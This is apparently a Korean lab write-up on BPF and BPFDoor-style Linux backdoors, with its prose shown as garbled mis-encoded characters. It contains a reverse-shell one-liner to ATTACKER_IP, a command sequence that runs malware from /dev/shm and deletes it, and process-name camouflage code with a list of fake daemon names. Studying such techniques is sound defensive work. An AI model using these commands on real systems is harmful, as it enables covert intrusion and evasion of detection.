# ğŸ› ï¸ BPF (Berkeley Packet Filter)

> **BPF**ëŠ” ìœ ì € ëª¨ë“œ í”„ë¡œê·¸ë¨ì´ ë„¤íŠ¸ì›Œí¬ í•„í„°ì— ì–´íƒœì¹˜í•˜ì—¬ ì†Œì¼“ì„ í†µí•´ ë“¤ì–´ì˜¤ëŠ” ë°ì´í„°ë¥¼ í—ˆìš©í•˜ê±°ë‚˜ ê±°ë¶€í•  ìˆ˜ ìˆê²Œ í—ˆìš©í•´ ì£¼ëŠ” ê¸°ìˆ ì´ë‹¤. ì¦‰ ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œê·¸ë¨ì´ ì‚¬ìš© ì¤‘ì¸ ë„¤íŠ¸ì›Œí¬ ì†Œì¼“ì— íŒ¨í‚· í•„í„°ë§ ë£°ì„ ë“±ë¡í•  ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ í†µí•´ ë°ì´í„°ë¥¼ ì½ê±°ë‚˜ ì•Œë¦¼ì„ ë°›ì„ ìˆ˜ ìˆë‹¤.

1992ë…„ì— ê°œë°œë˜ì–´ íŒ¨í‚· í•„í„°ë¡œ íŒ¨í‚·ì„ ë¶„ì„í•˜ê³  í•„í„°ë§í•˜ëŠ”ë°ì— ì‚¬ìš©ë˜ëŠ” in-kernel virtual machineìœ¼ë¡œ BSDì—ì„œ ì²˜ìŒìœ¼ë¡œ ë„ì…í•˜ì˜€ë‹¤. ë„¤íŠ¸ì›Œí¬ ë¶„ì„ ë„êµ¬ (ì˜ˆ: tcpdump, wireshark)ëŠ” ëŒ€ëŸ‰ì˜ íŒ¨í‚· ì¤‘ì—ì„œ ê´€ì‹¬ ìˆëŠ” íŒ¨í‚·ë§Œ ë¹ ë¥´ê²Œ ì¶”ì¶œí•´ì•¼ í•©ë‹ˆë‹¤. ëª¨ë“  íŒ¨í‚·ì„ ì‚¬ìš©ì ê³µê°„ìœ¼ë¡œ ê°€ì ¸ì™€ í•„í„°ë§í•˜ë©´ ì„±ëŠ¥ì´ ë§¤ìš° ë‚˜ë¹ ì§‘ë‹ˆë‹¤.

ë”°ë¼ì„œ ì»¤ë„ë ˆë²¨ì—ì„œ ë¨¼ì € í•„í„°ë§ í•˜ê³  í•„ìš”í•œ íŒ¨í‚·ë§Œ ìœ ì € ê³µê°„ìœ¼ë¡œ ì „ë‹¬í•˜ëŠ” BPFê°€ ë“±ì¥í•˜ì˜€ë‹¤


## ğŸ”‘ BPF Backdoor

BPFëŠ” ì»¤ë„ ë„¤íŠ¸ì›Œí¬ ìŠ¤íƒì˜ ì´ˆê¸°ë‹¨ê³„ socketì´ì „ì— í•„í„°ë§ì´ ê°€ëŠ¥í•˜ë‹¤. ë”°ë¼ì„œ í¬íŠ¸ë¥¼ ë¦¬ìŠ¨í•˜ì§€ ì•Šì•„ë„ íŒ¨í‚·ì„ ê°€ë¡œì±„ëŠ”ê²ƒì´ ê°€ëŠ¥í•˜ë‹¤

ë”°ë¼ì„œ
* ë¦¬ìŠ¤ë‹ í¬íŠ¸ ì—†ìŒ: ì™¸ë¶€ì— ë…¸ì¶œë˜ëŠ” í¬íŠ¸ ì—†ìŒ
* Fileless: ë””ìŠ¤í¬ì— í”ì ì„ ë‚¨ê¸°ì§€ì•ŠìŒ
* ì»¤ë„ìˆ˜ì¤€ì—ì„œ íŠ¹ì • íŒ¨í‚·ë§Œ ìˆ˜ì‹ 
* RC4 ì•”í˜¸í™” í†µì‹ 
* iptable ê·œì¹™ ì¡°ì‘ìœ¼ë¡œ í¬íŠ¸ ë¦¬ë‹¤ì´ë ‰ì…˜
* ì‹œìŠ¤í…œ ë°ëª¬ì´ë¦„ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ ìœ„ì¥

### ğŸ”§ íŠ¹ì§•
* ì„¤ì¹˜ ìœ„ì¹˜: ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œ (ì¼ë°˜ì ìœ¼ë¡œ ë°±ê·¸ë¼ìš´ë“œ í”„ë¡œì„¸ìŠ¤)
* ë™ì‘ ë°©ì‹: eBPFë¡œ íŒ¨í‚· ê²€ì‚¬ â†’ íŠ¹ì • ì‹œê·¸ë‹ˆì²˜ê°€ ë“¤ì–´ì˜¤ë©´ ì‰˜ ì‹¤í–‰
* ê¸°ëŠ¥: ëª…ë ¹ì–´ ì‹¤í–‰, ì—­ë°©í–¥ ì‰˜, í¬íŠ¸ë¦¬ìŠ¤ë‹ ì—†ì´ ëª…ë ¹ ìˆ˜ì‹ 
* ì ‘ê·¼ ë°©ë²•: ë¹„ì •ìƒì ì¸ TCP/UDP íŒ¨í‚· ì´ìš©, í¬íŠ¸ ì—´ì§€ ì•ŠìŒ
* íƒì§€ ë‚œì´ë„: ë§¤ìš° ì–´ë µë‹¤. ëŒ€ë¶€ë¶„ì˜ ë³´ì•ˆ ì†”ë£¨ì…˜ìœ¼ë¡œ íƒì§€ ë¶ˆê°€

### ğŸ”¥ í•µì‹¬ ì°¨ë³„ì 

* ë°©í™”ë²½ ìš°íšŒ: ë°©í™”ë²½ì´ ì—´ë ¤ìˆì§€ ì•Šì•„ë„ ë‚´ë¶€ë¡œ ì ‘ê·¼ ê°€ëŠ¥
* ë¡œê·¸ ë¯¸ê¸°ë¡: ì»¤ë„ ë ˆë²¨ì—ì„œ ìˆ˜ì‹  â†’ ì‹œìŠ¤í…œ ë¡œê·¸ì— ë‚¨ì§€ ì•ŠìŒ
* í¬íŠ¸ë¦¬ìŠ¤: ë¦¬ìŠ¤ë‹ í¬íŠ¸ ì—†ì´ë„ ëª…ë ¹ ìˆ˜ì‹  (ì •ì  ë¶„ì„ìœ¼ë¡œë„ íƒì§€ ì–´ë ¤ì›€)

----

## Reverse Shell

ê³µê²©ìê°€ í”¼í•´ìì˜ ì»´í“¨í„°ë¡œ ì ‘ì†í•˜ëŠ”ê²ƒì´ ì•„ë‹Œ í”¼í•´ìì˜ ì»´í“¨í„°ê°€ ê³µê²©ìì˜ ì»´í“¨í„°ì— ì ‘ì†í•˜ì—¬ ì‰˜ì„ ì œê³µí•˜ëŠ” ë°©ì‹

ì•„ì›ƒë°”ìš´ë“œ ì¸ë°”ìš´ë“œ ë³´ì•ˆì„ ìš°íšŒ

```css
[í”¼í•´ì PC] â ì ‘ì† â [ê³µê²©ì PC]
             ì‰˜ì„ ì—´ì–´ì¤Œ
```
### ğŸ§± 2. ì „í†µì  ê³µê²©ê³¼ì˜ ì°¨ì´ì 

| ë°©ì‹    | ê³µê²©ì ì—­í•       | í”¼í•´ì ì—­í•         | ë°©í™”ë²½ ìš°íšŒ |
| ----- | ----------- | ------------- | ------ |
| ë°”ì¸ë“œ ì‰˜ | ì—°ê²° ìš”ì²­       | ì„œë²„ì²˜ëŸ¼ ëŒ€ê¸°(bind) | ì–´ë µë‹¤    |
| ë¦¬ë²„ìŠ¤ ì‰˜ | ë¦¬ìŠ¤ë„ˆ(Listen) | í´ë¼ì´ì–¸íŠ¸ì²˜ëŸ¼ ì—°ê²°    | ì‰¬ì›€ âœ”ï¸  |


* **Example**
    
1. ê³µê²©ì
```bash
nc -lvnp 4444
```

2. í”¼í•´ì

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ==> localhost
```

## Memory based FS

ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì—ì„œ 
```bash
/dev/shm
```
ê²½ë¡œëŠ” ë©”ëª¨ë¦¬ ê¸°ë°˜ì˜ íŒŒì¼ ì‹œìŠ¤í…œìœ¼ë¡œ ì£¼ë¡œ ì„ì‹œë°ì´í„° ì €ì¥ì´ë‚˜ ì²˜ë¦¬ì— ì‚¬ìš©ëœë‹¤ -> ë””ìŠ¤í¬ì— ê¸°ë¡ë˜ì§€ì•Šê³  ë©”ëª¨ë¦¬ìƒì—ì„œë§Œ ìš´ì˜ë˜ê¸°ì— ìì£¼ ì•…ìš©ëœë‹¤

```bash
/bin/rm -f /dev/shm/kdmtmpflush; # íŒŒì¼ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš° ì§€ìš´ë‹¤ -> ì´ˆê¸°í™” ëŠë‚Œ
/bin/cp [ì•…ì„±ì½”ë“œ] /dev/shm/kdmtmpflush && # ì•…ì„±ì½”ë“œ ë°”ì´ë„ˆë¦¬ ë³µì‚¬
/bin/chmod 755 /dev/shm/kdmtmpflush && # íŒŒì¼ ì‹¤í–‰ê¶Œí•œ ì„¤ì •
/dev/shm/kdmtmpflush â€“init kdmtmpflush && # ì•…ì„±ì½”ë“œ ì‹¤í–‰

/bin/rm -f /dev/shm/kdmtmpflush # ì›ë³¸ì€ ì§€ìš°ê¸°
```

**â“ ì™œ `/dev/shm` ì¸ê°€?**

1. ğŸ§  ë©”ëª¨ë¦¬ ê¸°ë°˜ì´ë¼ í”ì ì´ ë””ìŠ¤í¬ì— ë‚¨ì§€ ì•ŠìŒ
    * /dev/shmì€ RAM ê¸°ë°˜ ì„ì‹œ íŒŒì¼ì‹œìŠ¤í…œ (tmpfs)ì…ë‹ˆë‹¤.
    * íŒŒì¼ì„ ì—¬ê¸°ì— ë³µì‚¬í•˜ê³  ì‹¤í–‰í•˜ë©´, ë””ìŠ¤í¬ I/O ì—†ì´ ë©”ëª¨ë¦¬ì—ì„œ ì§ì ‘ ì‹¤í–‰ë©ë‹ˆë‹¤.
    * ì‹¤í–‰ í›„ ì‚­ì œí•˜ë©´ ë””ìŠ¤í¬ í¬ë Œì‹, ë¡œê·¸ ê¸°ë°˜ íƒì§€ì— í”ì ì„ ë‚¨ê¸°ì§€ ì•ŠìŒ.
2. ğŸ•µï¸ ë””ìŠ¤í¬ ê°ì‹œ íƒì§€ ìš°íšŒ 
    * /dev/shmì€ ì¼ë°˜ì ìœ¼ë¡œ ëœ ê°ì‹œë˜ë¯€ë¡œ, ì—¬ê¸°ì— ë³µì‚¬í•˜ì—¬ ì‹¤í–‰í•˜ë©´ íƒì§€ í™•ë¥ ì´ ì¤„ì–´ë“¦.


## ğŸª– Camouflage

ì •ì‹ íˆ ìˆëŠ” ê´€ë¦¬ìë¼ë©´ ê°€ë”ì”© ì–´ë–¤ í”„ë¡œì„¸ìŠ¤ë“¤ì´ ëŒì•„ê°€ê³  ìˆëŠ”ì§€ í™•ì¸ì„ í•˜ê¸´ í•  ê²ƒì´ë‹¤. ë”°ë¼ì„œ í•´ì»¤ë“¤ì€ ê·¸ëŸ´ë“¯í•œ ì´ë¦„ì„ í†µí•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ìˆ¨ê¸°ê³ ì í•œë‹¤
ì´ëŠ” `prctl()` í•¨ìˆ˜ë¥¼ í†µí•´ í•  ìˆ˜ ìˆë‹¤

```cpp
char *self[] = {
    "/sbin/udevd -d",
    "/sbin/mingetty /dev/tty7",
    "/usr/sbin/console-kit-daemon --no-daemon",
    "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event",
    "dbus-daemon --system",
    "hald-runner",
    "pickup -l -t fifo -u",
    "avahi-daemon: chroot helper",
    "/sbin/auditd -n",
    "/usr/lib/systemd/systemd-journald"
};
```

| ìœ„ì¥ ë¬¸ìì—´                     | ì‹¤ì œ ìš©ë„           | ì™œ ìœ„ì¥í• ê¹Œ?                |
| -------------------------- | --------------- | ---------------------- |
| `/sbin/udevd -d`           | Udev ì¥ì¹˜ ê´€ë¦¬ì     | í•­ìƒ ì‹¤í–‰ë˜ë¯€ë¡œ ëˆˆì— ë„ì§€ ì•ŠìŒ      |
| `/sbin/mingetty /dev/tty7` | í„°ë¯¸ë„ ë¡œê·¸ì¸ ë°ëª¬      | tty ë‹¨ë§ ê´€ë ¨, ìµìˆ™í•œ ì´ë¦„      |
| `console-kit-daemon`       | ë¡œê·¸ì¸/ì„¸ì…˜ ê´€ë¦¬ ë°ëª¬    | GUI ì‹œìŠ¤í…œì—ì„œ í”í•¨           |
| `dbus-daemon --system`     | IPC ë©”ì‹œì§€ ë²„ìŠ¤ ë°ëª¬   | í•­ìƒ ì‹¤í–‰ë¨                 |
| `hald-runner`              | HAL í•˜ë“œì›¨ì–´ ì¶”ìƒí™” ë°ëª¬ | ìš”ì¦˜ì€ ì‚¬ìš© ì•ˆë˜ì§€ë§Œ ë‚¨ì•„ ìˆì„ ìˆ˜ ìˆìŒ |
| `auditd -n`                | ë³´ì•ˆ ê°ì‚¬ ë°ëª¬        | ê¶Œí•œ ìˆëŠ” ë°ëª¬, ì˜ì‹¬ ì•ˆ ë°›ìŒ      |
| `systemd-journald`         | ì‹œìŠ¤í…œ ë¡œê·¸ ê¸°ë¡       | ì™„ì „í•œ í•µì‹¬ í”„ë¡œì„¸ìŠ¤ì²˜ëŸ¼ ë³´ì„       |


```cpp
#include <stdio.h>
#include <sys/prctl.h>
#include <string.h>

int main() {
    const char *new_name = "unsuspicious-name";
    
    if (prctl(PR_SET_NAME, (unsigned long)new_name, 0, 0, 0) == -1) {
        perror("prctl");
        return 1;
    }
    // pid í™•ì¸ (ps aux | grep '^roh')
    // ë³€ê²½ëœ ì´ë¦„ í™•ì¸ (ps -o comm -p <pid>)
    while(1) {
        sleep(10);
    }

    return 0;
}
```

----

## ğŸƒ ì‹¤ìŠµ

ë¦¬ëˆ…ìŠ¤ ë¨¸ì‹ ì—ì„œ ë‹¤ìŒ ë‘íŒŒì¼ì„ ì»´íŒŒì¼ [bpf](./light-bpf.c) [trigger](./light-trigger.c) 

ì‰˜ì„ ì—¬ëŸ¬ê°œ ì¤€ë¹„í•˜ê³  ê³µê²©ì ì—­í• ì„ í•  ì‰˜ì—ì„œ `nc -lvnp 4444` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ì„ ëŒ€ê¸°í•œë‹¤

í•œ ì‰˜ì—ì„œëŠ” ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ [bpf](./light-bpf.c) ì‹¤í–‰ í•œì‰˜ì—ì„œëŠ” [trigger](./light-trigger.c) íŠ¸ë¦¬ê±°ë¥¼ ì‘ë™í•œë‹¤ ì´í›„ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°ì´ ë˜ëŠ” ëª¨ìŠµì„ í™•ì¸í• ìˆ˜ ìˆë‹¤


## ğŸ’­ ê³ ì°°

ì£¼ê¸°ì ìœ¼ë¡œ ì‹¤í–‰ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ì ê²€í•´ë³´ì

ì•„ì›ƒë°”ìš´ë“œ ì„¤ì •ë„ ì¤‘ìš”í•˜ë‹¤

ê·¸ëŸ¼ì—ë„ í„¸ë¦´ìˆ˜ìˆìœ¼ë‹ˆ ì¤‘ìš” ë°ì´í„°ëŠ” ì•”í˜¸í™”í•˜ì



----
Credits

[gwillgues](https://github.com/gwillgues/BPFDoor/)
[pjt3591oo](https://github.com/pjt3591oo/bpfdoor)